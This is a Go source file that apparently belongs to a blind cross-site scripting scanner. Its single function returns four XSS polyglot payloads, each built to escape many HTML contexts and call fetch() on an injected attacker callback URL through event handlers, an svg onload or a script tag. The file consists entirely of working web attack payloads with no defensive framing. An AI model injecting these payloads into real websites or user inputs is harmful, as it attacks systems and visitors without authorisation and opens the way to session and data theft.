package payloads

import "fmt"

// GetPolyglots returns a list of advanced polyglot payloads injected with the callback URL
func GetPolyglots(callbackURL string) []string {
	return []string{
		// 0xSobky's Polyglot (Modified for Blind XSS)
		fmt.Sprintf("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=fetch('%s') )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch('%s')//>\\x3e", callbackURL, callbackURL),

		// Rsnake's Polyglot (Modernized)
		fmt.Sprintf("javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/fetch('%s')//>", callbackURL),

		// HTML/JS/CSS Polyglot
		fmt.Sprintf("\"></script><script>/*%s*/fetch('%s')</script>", callbackURL, callbackURL),

		// SVG/XML Polyglot
		fmt.Sprintf("<![CDATA[<]]> <svg/onload=fetch('%s')>", callbackURL),
	}
}
